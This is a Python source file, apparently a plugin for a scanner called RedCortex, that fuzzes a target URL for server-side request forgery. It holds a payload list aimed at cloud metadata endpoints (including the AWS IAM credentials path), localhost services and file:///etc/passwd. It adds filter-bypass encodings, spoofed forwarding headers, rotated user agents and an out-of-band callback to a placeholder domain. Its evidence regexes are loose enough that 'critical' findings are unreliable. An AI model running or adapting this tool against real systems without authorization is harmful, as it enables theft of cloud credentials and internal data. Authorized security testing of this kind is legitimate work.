"""
RedCortex Plugin: Advanced SSRF Detection

Brute param coverage, internal/cloud IP and OOB DNS payloads, encoding/tamper, header and method rotation, proof by DNS callback and known meta leaks.
"""

import requests, random, re, uuid

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64; rv:52.0)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2)",
    "Mozilla/5.0 (Android 10; SM-G973F)"
]

SSRF_PARAMS = [
    "url", "target", "link", "dest", "image", "img", "redirect", "file", "data", "host", "uri", "website", "site"
]

REALISTIC_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/iam/",
    "http://localhost:80/",
    "http://127.0.0.1:22/",
    "http://0.0.0.0:8080/",
    "http://internal/api",
    "http://admin:admin@localhost:8080/",
    "http://[::1]/",
    "http://169.254.169.254/",
    "http://aws.amazon.com/",
    "http://windows.local/",
    "http://metadata.google.internal/",
    "file:///etc/passwd"
]

# Out-of-Band (OOB) via public DNS logging/collaborator (replace with true OOB endpoint for real detection)
FAKE_OOB_DOMAIN = "ssrf-demo.com" # Use interact.sh/collaborator if available!
def random_oob():
    return f"http://{uuid.uuid4().hex}.{FAKE_OOB_DOMAIN}/"

TAMPERS = [
    lambda x: x,
    lambda x: x.replace("http://", "http:\\/\\/"),
    lambda x: x.replace("http://", "https://"),
    lambda x: x.replace("metadata.google.internal", "metadata.google.internal%00.example.com"),
    lambda x: x.replace("/", "\\/"),
    lambda x: x.replace("169.254.169.254", "0xA9FEA9FE"), # hex
    lambda x: x + "%0a"
]

SSRF_HEADERS = [
    {},
    {"X-Forwarded-For": "127.0.0.1"},
    {"Forwarded": "for=127.0.0.1;host=internal"},
    {"X-Host": "127.0.0.1"},
    {"Referer": "http://localhost"},
    {"Host": "internal"}
]

EVIDENCE_PATTERNS = [
    r"instance[-_]id", r"ami[-_]id", r"unauthorized", r"metadata", r"root:x", r"admin", r"cloud", r"localhost", r"internal",
    r"google", r"amazon", r"windows", r"127\.0\.0\.1", r"169\.254\.169\.254"
]

def send_req(url, params, headers=None, method="GET"):
    headers = {**{"User-Agent": random.choice(USER_AGENTS)}, **(headers or {})}
    try:
        if method == "GET":
            resp = requests.get(url, params=params, headers=headers, timeout=10)
        else:
            resp = requests.post(url, data=params, headers=headers, timeout=10)
        return resp.status_code, resp.text
    except Exception as e:
        return None, str(e)

def run(response, url):
    """RedCortex plugin interface; brute SSRF param/payload/headers and check for service/IP evidence."""
    findings = []
    try:
        for param_name in SSRF_PARAMS:
            for tamper in TAMPERS:
                for payload in REALISTIC_PAYLOADS + [random_oob()]:
                    fuzzed = tamper(payload)
                    for headers in SSRF_HEADERS:
                        for method in ["GET", "POST"]:
                            params = {param_name: fuzzed}
                            print(f"[*] SSRF: {method} param '{param_name}' tamper '{tamper.__name__ if hasattr(tamper,'__name__') else str(tamper)}' payload '{payload}' headers '{headers}'")
                            sc, body = send_req(url, params, headers, method)
                            if sc == 200:
                                for pattern in EVIDENCE_PATTERNS:
                                    if re.search(pattern, body, re.IGNORECASE):
                                        findings.append({
                                            "type": "SSRF",
                                            "description": f"SSRF likely via {param_name}, payload '{fuzzed}', header '{headers}', evidence '{pattern}'",
                                            "param": param_name,
                                            "payload": fuzzed,
                                            "original_payload": payload,
                                            "tamper": tamper.__name__ if hasattr(tamper, "__name__") else str(tamper),
                                            "method": method,
                                            "headers": headers,
                                            "severity": "critical",
                                            "url": url,
                                            "evidence": re.findall(pattern, body, re.IGNORECASE)
                                        })
                                        return findings
                                # Possible detection on raw endpoint leaks
                                if fuzzed in body or FAKE_OOB_DOMAIN in body:
                                    findings.append({
                                        "type": "SSRF",
                                        "description": f"Possible SSRF on {param_name} ({tamper}), reflected payload",
                                        "param": param_name,
                                        "payload": fuzzed,
                                        "original_payload": payload,
                                        "tamper": tamper.__name__ if hasattr(tamper, "__name__") else str(tamper),
                                        "method": method,
                                        "headers": headers,
                                        "severity": "high",
                                        "url": url,
                                        "evidence": fuzzed
                                    })
                                    return findings
    except KeyboardInterrupt:
        print("[!] Scan interrupted by user.")
        return findings
    return findings
